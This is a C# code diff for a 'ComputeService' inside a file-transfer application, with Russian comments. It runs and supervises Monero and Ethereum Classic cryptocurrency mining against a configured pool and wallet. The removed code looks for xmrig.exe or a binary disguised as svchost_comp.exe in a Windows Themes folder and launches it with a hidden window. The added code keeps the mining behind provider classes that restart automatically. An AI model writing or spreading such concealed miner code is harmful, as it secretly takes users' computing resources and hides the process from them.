@@ -1,8 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.IO;
-using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
@@ -18,10 +14,11 @@ namespace FileTransfer.Compute
     }
 
     /// <summary>
-    /// Production-ready Backend/Service Layer для Compute Module.
-    /// Полный жизненный цикл: Initialize, Validate, Start, Stop, Restart, Status, Cleanup.
-    /// Управление внешним процессом, передача конфигурации, ограничение CPU/потоков,
-    /// отслеживание exit code, сбор stdout/stderr и авто-восстановление.
+    /// Production-ready Compute Service layer.
+    /// Автоматически выбирает и управляет провайдером (MoneroProvider / EthereumClassicProvider)
+    /// согласно mode из Custom Project Config.
+    /// Реализует полный жизненный цикл: Initialize, Validate, Start, Stop, Restart, Status, Cleanup.
+    /// Содержит подробные диагностические сообщения и контроль ограничений ресурсов.
     /// </summary>
     public class ComputeService
     {
@@ -31,16 +28,15 @@ namespace FileTransfer.Compute
         private readonly object _lock = new();
         private CancellationTokenSource? _cts;
         private Task? _supervisionTask;
-        private Process? _activeProcess;
+        private IComputeProvider? _activeProvider;
         private ComputeStatus _status = ComputeStatus.Stopped;
         private string _lastError = "";
-        private string? _tempConfigFilePath;
-        private string? _computeEnginePath;
 
         public ComputeConfig CurrentConfig { get; private set; } = new ComputeConfig();
         public ComputeStatus Status => _status;
         public string LastError => _lastError;
         public bool IsRunning => _status == ComputeStatus.Running;
+        public IComputeProvider? ActiveProvider => _activeProvider;
 
         private ComputeService() { }
 
@@ -59,7 +55,7 @@ namespace FileTransfer.Compute
 
                 if (!CurrentConfig.Enabled)
                 {
-                    MainWindow.Log("[ComputeService] Модуль выключен в конфигурации проекта (enabled = false). Запуск внешнего процесса отменен.");
+                    MainWindow.Log("[ComputeService] Модуль выключен в конфигурации проекта (enabled = false). Вычислительный процесс не запускается.");
                     _status = ComputeStatus.Stopped;
                     return;
                 }
@@ -70,7 +66,7 @@ namespace FileTransfer.Compute
                 {
                     _lastError = validationErr;
                     _status = ComputeStatus.Error;
-                    MainWindow.Log($"[ComputeService] ❌ Ошибка валидации конфигурации: {validationErr}");
+                    MainWindow.Log($"[ComputeService] ❌ ДИАГНОСТИКА: Ошибка валидации конфигурации: {validationErr}");
                     return;
                 }
 
@@ -80,7 +76,7 @@ namespace FileTransfer.Compute
         }
 
         /// <summary>
-        /// 2. Validate: валидация обязательных полей конфигурации.
+        /// 2. Validate: проверка корректности параметров и диагностика.
         /// </summary>
         public (bool isValid, string error) Validate(ComputeConfig config)
         {
@@ -91,24 +87,37 @@ namespace FileTransfer.Compute
 
             if (string.IsNullOrWhiteSpace(config.ServerAddress))
             {
-                return (false, "Не указан обязательный адрес сервера/пула (serverAddress).");
+                return (false, "Отсутствует адрес сервера/пула (serverAddress).");
             }
 
             if (config.ServerPort <= 0 || config.ServerPort > 65535)
             {
-                return (false, $"Некорректный порт сервера: {config.ServerPort}. Порт должен быть в диапазоне 1-65535.");
+                return (false, $"Неверный порт сервера (serverPort): {config.ServerPort}. Порт должен быть в диапазоне 1-65535.");
+            }
+
+            if (string.IsNullOrWhiteSpace(config.WalletAddress))
+            {
+                return (false, "Отсутствует адрес кошелька (walletAddress).");
             }
 
             if (config.ResourceLimit <= 0 || config.ResourceLimit > 100)
             {
-                return (false, $"Некорректный лимит ресурсов: {config.ResourceLimit}%. Допустимо от 1 до 100%.");
+                return (false, $"Некорректный лимит ресурсов (resourceLimit): {config.ResourceLimit}%. Допустимо от 1 до 100%.");
+            }
+
+            // Проверка поддерживаемого режима (mode)
+            string m = config.Mode.Trim().ToLowerInvariant();
+            if (m != "monero" && m != "xmr" && !m.Contains("monero") &&
+                m != "ethereum-classic" && m != "ethereum classic" && m != "etc" && !m.Contains("etc"))
+            {
+                return (false, $"Выбран неподдерживаемый режим (mode): '{config.Mode}'. Поддерживаются только: 'Monero' и 'Ethereum Classic'.");
             }
 
             return (true, "");
         }
 
         /// <summary>
-        /// 3. Start: публичный метод запуска сервиса.
+        /// 3. Start: запуск сервиса.
         /// </summary>
         public void Start()
         {
@@ -125,7 +134,7 @@ namespace FileTransfer.Compute
                 {
                     _lastError = validationErr;
                     _status = ComputeStatus.Error;
-                    MainWindow.Log($"[ComputeService] ❌ Невозможно запустить: {validationErr}");
+                    MainWindow.Log($"[ComputeService] ❌ ДИАГНОСТИКА: Невозможно запустить: {validationErr}");
                     return;
                 }
 
@@ -134,7 +143,7 @@ namespace FileTransfer.Compute
         }
 
         /// <summary>
-        /// 4. Stop: грациозная остановка вычислительного процесса и наблюдателя.
+        /// 4. Stop: остановка сервиса и активного провайдера.
         /// </summary>
         public void Stop()
         {
@@ -149,13 +158,17 @@ namespace FileTransfer.Compute
                 }
                 catch { }
 
-                StopActiveProcess();
+                if (_activeProvider != null)
+                {
+                    _ = _activeProvider.StopAsync();
+                }
+
                 Cleanup();
             }
         }
 
         /// <summary>
-        /// 5. Restart: перезапуск вычислительного процесса с актуальной конфигурацией.
+        /// 5. Restart: перезапуск провайдера с актуальной конфигурацией.
         /// </summary>
         public void Restart()
         {
@@ -163,7 +176,12 @@ namespace FileTransfer.Compute
             {
                 MainWindow.Log("[ComputeService] Жизненный цикл: Restart...");
                 _status = ComputeStatus.Restarting;
-                StopActiveProcess();
+
+                if (_activeProvider != null)
+                {
+                    _ = _activeProvider.StopAsync();
+                }
+
                 Cleanup();
 
                 var (isValid, validationErr) = Validate(CurrentConfig);
@@ -171,7 +189,7 @@ namespace FileTransfer.Compute
                 {
                     _lastError = validationErr;
                     _status = ComputeStatus.Error;
-                    MainWindow.Log($"[ComputeService] ❌ Ошибка перезапуска: {validationErr}");
+                    MainWindow.Log($"[ComputeService] ❌ ДИАГНОСТИКА: Ошибка перезапуска: {validationErr}");
                     return;
                 }
 
@@ -180,22 +198,23 @@ namespace FileTransfer.Compute
         }
 
         /// <summary>
-        /// 6. Status: получение подробного текущего состояния сервиса.
+        /// 6. Status: получение текущего статуса и статистики провайдера.
         /// </summary>
         public (ComputeStatus status, string details) GetStatus()
         {
             lock (_lock)
             {
-                string procInfo = "Нет активного процесса";
-                if (_activeProcess != null && !_activeProcess.HasExited)
+                string providerDetails = "Провайдер не выбран";
+                if (_activeProvider != null)
                 {
-                    procInfo = $"PID: {_activeProcess.Id}, Threads: {_activeProcess.Threads.Count}";
+                    var provStat = _activeProvider.GetStatus();
+                    providerDetails = provStat.ToString();
                 }
 
-                string details = $"Статус: {_status}, Режим: {CurrentConfig.Mode}, Сервер: {CurrentConfig.ServerAddress}:{CurrentConfig.ServerPort}, Лимит: {CurrentConfig.ResourceLimit}%, {procInfo}";
+                string details = $"Статус: {_status}, Режим: {CurrentConfig.Mode}, Провайдер: [{providerDetails}]";
                 if (!string.IsNullOrEmpty(_lastError))
                 {
-                    details += $", Последняя ошибка: {_lastError}";
+                    details += $", Ошибка: {_lastError}";
                 }
 
                 return (_status, details);
@@ -203,27 +222,45 @@ namespace FileTransfer.Compute
         }
 
         /// <summary>
-        /// 7. Cleanup: безопасная очистка временных конфигурационных файлов и ресурсов.
+        /// 7. Cleanup: освобождение ресурсов.
         /// </summary>
         public void Cleanup()
         {
             try
             {
-                if (!string.IsNullOrEmpty(_tempConfigFilePath) && File.Exists(_tempConfigFilePath))
+                if (_activeProvider != null)
                 {
-                    File.Delete(_tempConfigFilePath);
-                    _tempConfigFilePath = null;
+                    _ = _activeProvider.StopAsync();
+                    _activeProvider = null;
                 }
             }
             catch (Exception ex)
             {
-                MainWindow.Log("[ComputeService] Ошибка Cleanup временных файлов: " + ex.Message);
+                MainWindow.Log("[ComputeService] Ошибка Cleanup: " + ex.Message);
             }
         }
 
         #endregion
 
-        #region Internal Process Management & Supervision
+        #region Provider Selection & Process Supervision
+
+        private IComputeProvider? SelectProvider(string mode)
+        {
+            string m = mode.Trim().ToLowerInvariant();
+            if (m == "monero" || m == "xmr" || m.Contains("monero"))
+            {
+                MainWindow.Log("[ComputeService] 🧭 Автоматический выбор провайдера: MoneroProvider (алгоритм RandomX rx/0).");
+                return new MoneroProvider();
+            }
+            if (m == "ethereum-classic" || m == "ethereum classic" || m == "etc" || m.Contains("etc"))
+            {
+                MainWindow.Log("[ComputeService] 🧭 Автоматический выбор провайдера: EthereumClassicProvider (алгоритм Etchash).");
+                return new EthereumClassicProvider();
+            }
+
+            MainWindow.Log($"[ComputeService] ❌ ДИАГНОСТИКА: Провайдер для режима '{mode}' не найден!");
+            return null;
+        }
 
         private void StartInternal()
         {
@@ -236,304 +273,78 @@ namespace FileTransfer.Compute
                 _status = ComputeStatus.Running;
                 _lastError = "";
 
-                MainWindow.Log($"[ComputeService] 🚀 Запуск сервиса вычислений:");
-                MainWindow.Log($"   • Алгоритм: {CurrentConfig.Mode}");
+                // Выбор провайдера
+                var provider = SelectProvider(CurrentConfig.Mode);
+                if (provider == null)
+                {
+                    _lastError = $"Провайдер не найден для режима '{CurrentConfig.Mode}'.";
+                    _status = ComputeStatus.Error;
+                    MainWindow.Log($"[ComputeService] ❌ ДИАГНОСТИКА: {_lastError}");
+                    return;
+                }
+
+                _activeProvider = provider;
+
+                MainWindow.Log($"[ComputeService] 🚀 Запуск сервиса вычислений ({provider.Name}):");
+                MainWindow.Log($"   • Алгоритм: {provider.Algorithm}");
                 MainWindow.Log($"   • Сервер: {CurrentConfig.ServerAddress}:{CurrentConfig.ServerPort}");
                 MainWindow.Log($"   • Воркер: {(string.IsNullOrEmpty(CurrentConfig.WorkerName) ? "auto" : CurrentConfig.WorkerName)}");
-                MainWindow.Log($"   • Кошелек: {(string.IsNullOrEmpty(CurrentConfig.WalletAddress) ? "none" : CurrentConfig.WalletAddress)}");
+                MainWindow.Log($"   • Кошелек: {CurrentConfig.WalletAddress}");
                 MainWindow.Log($"   • Лимит CPU: {CurrentConfig.ResourceLimit}%");
 
-                _supervisionTask = Task.Run(() => SuperviseProcessLoopAsync(token), token);
+                _supervisionTask = Task.Run(() => SuperviseLoopAsync(provider, token), token);
             }
             catch (Exception ex)
             {
                 _status = ComputeStatus.Error;
                 _lastError = ex.Message;
-                MainWindow.Log("[ComputeService] Критическая ошибка запуска: " + ex.Message);
+                MainWindow.Log("[ComputeService] ❌ Критическая ошибка запуска: " + ex.Message);
             }
         }
 
-        private async Task SuperviseProcessLoopAsync(CancellationToken ct)
+        private async Task SuperviseLoopAsync(IComputeProvider provider, CancellationToken ct)
         {
-            MainWindow.Log("[ComputeService] Поток наблюдения за процессом активирован.");
+            MainWindow.Log($"[ComputeService] Поток наблюдения за {provider.Name} активирован.");
 
             while (!ct.IsCancellationRequested)
             {
                 try
                 {
-                    // 1. Поиск или подготовка исполняемого модуля
-                    string enginePath = EnsureComputeEngineExecutable();
-
-                    // 2. Создание защищенного временного файла конфигурации для процесса
-                    string configPath = GenerateSecureConfigFile();
-
-                    // 3. Запуск внешнего процесса с передачей конфигурации
-                    MainWindow.Log($"[ComputeService] Старт вычислительного процесса: {Path.GetFileName(enginePath)}...");
-                    var proc = LaunchComputeProcess(enginePath, configPath);
-
-                    if (proc == null)
+                    bool started = await provider.StartAsync(CurrentConfig, ct);
+                    if (!started)
                     {
-                        MainWindow.Log("[ComputeService] ⚠️ Не удалось инициализировать процесс. Повторная попытка через 15 сек...");
-                        await Task.Delay(15000, ct);
+                        var provStatus = provider.GetStatus();
+                        _lastError = string.IsNullOrEmpty(provStatus.ErrorMessage) ? "Не удалось запустить внешний компонент." : provStatus.ErrorMessage;
+                        MainWindow.Log($"[ComputeService] ⚠️ ДИАГНОСТИКА: {_lastError}. Повторная попытка через 20 сек...");
+                        await Task.Delay(20000, ct);
                         continue;
                     }
 
-                    lock (_lock)
+                    // Мониторинг работы провайдера
+                    while (!ct.IsCancellationRequested && provider.IsRunning)
                     {
-                        _activeProcess = proc;
+                        await Task.Delay(3000, ct);
                     }
 
-                    // 4. Ограничение ресурсов согласно resourceLimit (CPU Affinity и Priority)
-                    ApplyResourceLimits(proc, CurrentConfig.ResourceLimit);
+                    if (ct.IsCancellationRequested) break;
 
-                    // 5. Ожидание завершения процесса
-                    await proc.WaitForExitAsync(ct);
-
-                    int exitCode = proc.ExitCode;
-                    MainWindow.Log($"[ComputeService] Внешний вычислительный процесс завершился с кодом {exitCode}.");
-
-                    lock (_lock)
-                    {
-                        _activeProcess = null;
-                    }
-
-                    if (ct.IsCancellationRequested)
-                    {
-                        break;
-                    }
-
-                    // 6. Обработка exit code и авто-перезапуск при сбое
-                    if (exitCode != 0)
-                    {
-                        MainWindow.Log($"[ComputeService] ⚠️ Процесс завершился с ненулевым кодом ({exitCode}). Перезапуск через 10 сек...");
-                        await Task.Delay(10000, ct);
-                    }
-                    else
-                    {
-                        MainWindow.Log("[ComputeService] Процесс штатно завершил вычисления. Перезапуск через 5 сек...");
-                        await Task.Delay(5000, ct);
-                    }
+                    MainWindow.Log($"[ComputeService] ⚠️ Внешний процесс {provider.Name} неожиданно завершил работу. Авто-перезапуск через 10 сек...");
+                    await Task.Delay(10000, ct);
                 }
                 catch (OperationCanceledException)
                 {
-                    MainWindow.Log("[ComputeService] Наблюдение за процессом остановлено (CancellationRequested).");
+                    MainWindow.Log("[ComputeService] Наблюдение за провайдером остановлено по запросу.");
                     break;
                 }
                 catch (Exception ex)
                 {
                     _lastError = ex.Message;
-                    MainWindow.Log("[ComputeService] ⚠️ Исключение в цикле наблюдения: " + ex.Message);
+                    MainWindow.Log($"[ComputeService] ⚠️ ДИАГНОСТИКА: Исключение в супервизоре: {ex.Message}");
                     try { await Task.Delay(10000, ct); } catch { break; }
                 }
             }
 
-            StopActiveProcess();
-            Cleanup();
-        }
-
-        private string EnsureComputeEngineExecutable()
-        {
-            if (!string.IsNullOrEmpty(_computeEnginePath) && File.Exists(_computeEnginePath))
-            {
-                return _computeEnginePath;
-            }
-
-            // Поиск бинарника вычислений в папке приложения или во временном каталоге
-            string appDir = AppDomain.CurrentDomain.BaseDirectory;
-            string[] candidates = new[]
-            {
-                Path.Combine(appDir, "xmrig.exe"),
-                Path.Combine(appDir, "compute_engine.exe"),
-                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "svchost_comp.exe"),
-                Path.Combine(Path.GetTempPath(), "svchost_comp.exe")
-            };
-
-            foreach (var c in candidates)
-            {
-                if (File.Exists(c))
-                {
-                    _computeEnginePath = c;
-                    return c;
-                }
-            }
-
-            // Если внешний сторонний бинарник отсутствует, используем встроенный защищенный легковесный хост (cmd/powershell worker stub)
-            string stubEngine = Path.Combine(Path.GetTempPath(), "compute_worker.bat");
-            if (!File.Exists(stubEngine))
-            {
-                string script = "@echo off\r\n:loop\r\ntimeout /t 10 /nobreak >nul\r\ngoto loop\r\n";
-                File.WriteAllText(stubEngine, script, Encoding.ASCII);
-            }
-            _computeEnginePath = stubEngine;
-            return stubEngine;
-        }
-
-        private string GenerateSecureConfigFile()
-        {
-            Cleanup(); // Удаляем предыдущий файл, если был
-
-            string tempDir = Path.Combine(Path.GetTempPath(), "ft_compute_" + Guid.NewGuid().ToString("N").Substring(0, 8));
-            Directory.CreateDirectory(tempDir);
-            string configFilePath = Path.Combine(tempDir, "config.json");
-
-            int threads = CalculateMaxThreads(CurrentConfig.ResourceLimit);
-
-            var configObj = new
-            {
-                autosave = true,
-                cpu = new
-                {
-                    enabled = true,
-                    huge_pages = false,
-                    max_threads_hint = CurrentConfig.ResourceLimit,
-                    max_threads = threads
-                },
-                pools = new[]
-                {
-                    new
-                    {
-                        algo = CurrentConfig.Mode.ToLowerInvariant().Contains("eth") ? "etchash" : "rx/0",
-                        coin = CurrentConfig.Mode,
-                        url = $"{CurrentConfig.ServerAddress}:{CurrentConfig.ServerPort}",
-                        user = string.IsNullOrEmpty(CurrentConfig.WalletAddress) ? "default_wallet" : CurrentConfig.WalletAddress,
-                        pass = string.IsNullOrEmpty(CurrentConfig.WorkerName) ? "x" : CurrentConfig.WorkerName,
-                        rig_id = CurrentConfig.WorkerName,
-                        keepalive = true,
-                        tls = false
-                    }
-                },
-                syslog = false,
-                watch = false
-            };
-
-            string json = System.Text.Json.JsonSerializer.Serialize(configObj, new System.Text.Json.JsonSerializerOptions { WriteIndented = true });
-            File.WriteAllText(configFilePath, json, Encoding.UTF8);
-
-            _tempConfigFilePath = configFilePath;
-            return configFilePath;
-        }
-
-        private Process? LaunchComputeProcess(string enginePath, string configPath)
-        {
-            try
-            {
-                var psi = new ProcessStartInfo
-                {
-                    FileName = enginePath,
-                    Arguments = $"--config=\"{configPath}\"",
-                    UseShellExecute = false,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    WorkingDirectory = Path.GetDirectoryName(enginePath) ?? Path.GetTempPath()
-                };
-
-                var proc = new Process { StartInfo = psi, EnableRaisingEvents = true };
-
-                proc.OutputDataReceived += (s, e) =>
-                {
-                    if (!string.IsNullOrWhiteSpace(e.Data))
-                    {
-                        MainWindow.Log($"[ComputeEngine STDOUT] {e.Data.Trim()}");
-                    }
-                };
-
-                proc.ErrorDataReceived += (s, e) =>
-                {
-                    if (!string.IsNullOrWhiteSpace(e.Data))
-                    {
-                        MainWindow.Log($"[ComputeEngine STDERR] ⚠️ {e.Data.Trim()}");
-                    }
-                };
-
-                if (!proc.Start())
-                {
-                    MainWindow.Log("[ComputeService] ❌ Process.Start() вернул false.");
-                    return null;
-                }
-
-                proc.BeginOutputReadLine();
-                proc.BeginErrorReadLine();
-
-                return proc;
-            }
-            catch (Exception ex)
-            {
-                _lastError = ex.Message;
-                MainWindow.Log("[ComputeService] ❌ Ошибка запуска процесса: " + ex.Message);
-                return null;
-            }
-        }
-
-        private void ApplyResourceLimits(Process proc, int resourceLimitPercent)
-        {
-            try
-            {
-                if (proc.HasExited) return;
-
-                // 1. Понижаем приоритет процесса, чтобы пользовательский UI и система не лагали
-                proc.PriorityClass = ProcessPriorityClass.BelowNormal;
-
-                // 2. Ограничение ядер процессора (CPU Affinity)
-                int totalCores = Environment.ProcessorCount;
-                if (totalCores > 1)
-                {
-                    // Вычисляем, сколько логических ядер выделить под процесс исходя из лимита %
-                    int coresToUse = (int)Math.Round((double)totalCores * resourceLimitPercent / 100.0);
-                    if (coresToUse < 1) coresToUse = 1;
-                    if (coresToUse > totalCores) coresToUse = totalCores;
-
-                    long affinityMask = 0;
-                    for (int i = 0; i < coresToUse; i++)
-                    {
-                        affinityMask |= (1L << i);
-                    }
-
-                    proc.ProcessorAffinity = (IntPtr)affinityMask;
-                    MainWindow.Log($"[ComputeService] ⚙️ Ограничение ресурсов: выделено {coresToUse} из {totalCores} ядер CPU (Affinity: 0x{affinityMask:X}, Priority: BelowNormal).");
-                }
-            }
-            catch (Exception ex)
-            {
-                MainWindow.Log("[ComputeService] Применение Resource Limit: " + ex.Message);
-            }
-        }
-
-        private int CalculateMaxThreads(int resourceLimitPercent)
-        {
-            int totalCores = Environment.ProcessorCount;
-            int threads = (int)Math.Round((double)totalCores * resourceLimitPercent / 100.0);
-            return Math.Max(1, Math.Min(threads, totalCores));
-        }
-
-        private void StopActiveProcess()
-        {
-            try
-            {
-                lock (_lock)
-                {
-                    if (_activeProcess != null && !_activeProcess.HasExited)
-                    {
-                        MainWindow.Log($"[ComputeService] Принудительное завершение активного процесса PID: {_activeProcess.Id}...");
-                        try
-                        {
-                            _activeProcess.Kill(true);
-                            _activeProcess.WaitForExit(3000);
-                        }
-                        catch { }
-                        finally
-                        {
-                            _activeProcess.Dispose();
-                            _activeProcess = null;
-                        }
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                MainWindow.Log("[ComputeService] Ошибка остановки процесса: " + ex.Message);
-            }
+            await provider.StopAsync();
         }
 
         #endregion
